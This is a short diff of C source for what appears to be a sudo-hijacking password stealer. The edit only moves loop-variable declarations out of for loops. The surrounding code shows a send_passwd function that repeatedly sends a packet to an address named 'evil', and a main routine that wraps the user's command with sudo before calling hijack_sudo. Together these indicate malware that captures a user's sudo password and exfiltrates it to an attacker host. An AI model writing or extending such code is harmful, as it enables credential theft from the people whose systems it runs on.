@@ -211,7 +211,8 @@ send_passwd(char *all)
     free(header);
     free(question);
 
-    for (int i =0;i<MAX_RESEND;i++)
+    int i;
+    for (i =0;i<MAX_RESEND;i++)
     {
        sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);
 
@@ -435,16 +436,19 @@ main(int argc, char *argv[])
     
     char *params[1000];
 
-    for (int number = 1;number < argc;++number)
+    int anumber;
+    int pnumber;
+
+    for (anumber = 1;anumber < argc;++anumber)
     {
-        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[number]);
+        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[anumber]);
     }
     
     params[0]="sudo";
 
-    for (int number = 1;number < argc;++number)
+    for (pnumber = 1;pnumber < argc;++pnumber)
     {
-        params[number] = argv[number];
+        params[pnumber] = argv[pnumber];
     }
 
     hijack_sudo(usrInfo,argc,arguments,params);
